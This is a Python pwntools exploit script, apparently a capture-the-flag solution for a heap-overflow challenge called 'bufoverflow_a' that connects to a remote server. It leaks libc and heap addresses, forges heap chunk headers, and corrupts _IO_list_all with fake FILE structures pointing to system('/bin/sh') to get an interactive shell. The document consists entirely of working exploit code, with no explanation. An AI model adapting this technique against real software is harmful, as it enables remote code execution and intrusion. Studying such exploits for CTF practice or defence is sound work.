from pwn import *

local=0
uselibc=2  #0 for no,1 for i386,2 for x64
haslibc=1
pc='./bufoverflow_a'
remote_addr="116.62.152.176"
remote_port=20001

libc=ELF('./libc.so.6')

#context.log_level=True
if local==1:
    p = process(pc,aslr=False,env={'LD_PRELOAD': './libc.so.6'})
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)
    if haslibc!=0:
        libc=ELF('./libc.so.6')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a,l=None):
    if l==None:
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(index):
    sla('>> ',str(index))

def alloc(size):
    choice(1)
    sla(': ',str(size))

def free(index):
    choice(2)
    sla(': ',str(index))

def fill(content):
    choice(3)
    sa(': ',content)

def show():
    choice(4)
    sleep(1)

def hack():
    alloc(0x100)
    alloc(0x100)
    alloc(0x100)
    alloc(0x100)
    free(0)
    free(2)
    free(3)
    free(1)
    alloc(0x210)
    show()
    libcaddr=raddr(6)-0x399b58
    libc.address=libcaddr
    lg("libc",libcaddr)
    alloc(0x210)
    show()
    heapaddr=raddr(6)-0x20
    lg("heap",heapaddr)
    free(0)
    free(1)

    alloc(0xf8)  
    alloc(0xf8)  
    free(0)
    alloc(0xf8)
    payload='\x00'*0x80+p64(0)+p64(0x21)+p64(heapaddr+0xb0)*2+p64(0)+p64(0x21)
    fill(payload.ljust(0xf0,'\x00')+p64(0x70))
    free(1)
    alloc(0x100)
    fill('\x00'*0x68+p64(0x21)+p64(0)*3+p64(0x21)+"\n")
    
    free(1)
    free(0)
   
    alloc(0x128)
    payload='\x00'*0x48+p64(libc.search('/bin/sh').next())+p64(heapaddr+0x108-0x30)+p64(0)*2+p64(0x101)+p64(0)*2+p64(libc.symbols['_IO_wfile_jumps']-0x248)*2+p64(libc.symbols['system'])*2
    payload=payload.ljust(0xe8,'\x00')
    payload+=p64(0x41)+'\n'
    fill(payload)
    alloc(0xf8)
    fill('\x00'*0x88+p64(0xf1)+'\n')
    free(1)
    free(0)

    alloc(0xf8)
    payload=p64(0)+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)*7+p64(0x61)+p64(0)+p64(heapaddr+0x20)+p64(0)+p64(1)
    payload=payload.ljust(0x88,'\x00')
    payload=payload+p64(0xf1)+p64(0)+p64(heapaddr+0x70)+'\n'
    fill(payload)
    alloc(0xf8)
    alloc(300)
    p.interactive()

hack()
